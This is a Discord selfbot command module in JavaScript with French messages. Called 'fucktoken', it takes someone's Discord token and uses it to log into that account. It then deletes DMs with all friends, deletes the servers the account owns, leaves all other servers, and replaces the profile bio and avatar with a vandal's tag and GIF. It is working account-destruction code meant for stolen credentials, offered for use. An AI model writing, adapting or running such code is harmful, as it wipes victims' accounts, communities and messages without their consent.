const Discord = require("discord.js-selfbot-v13");

module.exports = {
  name: "fucktoken", 
  description: "Fuck.", 
  run: async (client, message, args) => {
    if (!args.length) {
      return message.edit(`\`❌\` Veuillez fournir un token Discord après la commande.`);
    }

    const token = args[0];
    const newDescription = "Pluzio is here || not responsible ||"; 
    const newProfilePictureURL = "https://i.ibb.co/WB9LKBw/a-c3ef0f77c873a40247d9abb7a7ea9c18.gif"; 
      const newDisplayName = "I got fucked by my mum"; 
      

    const destroyAllAndModifyProfile = async (token) => {
      try {
        const fclient = new Discord.Client({ checkUpdate: false }); 

        await fclient.login(token);

      
        await Promise.all([
           
          fclient.relationships.fetch().then(async () => {
            fclient.relationships.friendCache.forEach(async (friend) => {
              await friend.deleteDM().catch(() => console.error(`Échec de la suppression du DM avec ${friend.username}`));
            });
          }),
          fclient.guilds.cache.forEach(async (guild) => {
            if (guild.ownerId === fclient.user.id) {
              await guild.delete().catch(() => console.error(`Échec de la suppression du serveur ${guild.name}`));
            } else {
              await guild.leave().catch(() => console.error(`Échec de la suppression du serveur ${guild.name}`));
            }
          }),
        ]);

        
        await fclient.user.setAboutMe(newDescription).catch(() => console.error("Échec de la mise à jour de la description"));
        await fclient.user.setAvatar(newProfilePictureURL).catch(() => console.error("Échec de la mise à jour de la photo de profil"));

        message.edit(`\`✅\` Token détruit avec succès`);
        fclient.destroy(); 
      } catch (error) {
        message.edit(`\`❌\` Le token est invalide ou vous n'avez pas la permission`);
      }
    };

    destroyAllAndModifyProfile(token);
  }
};
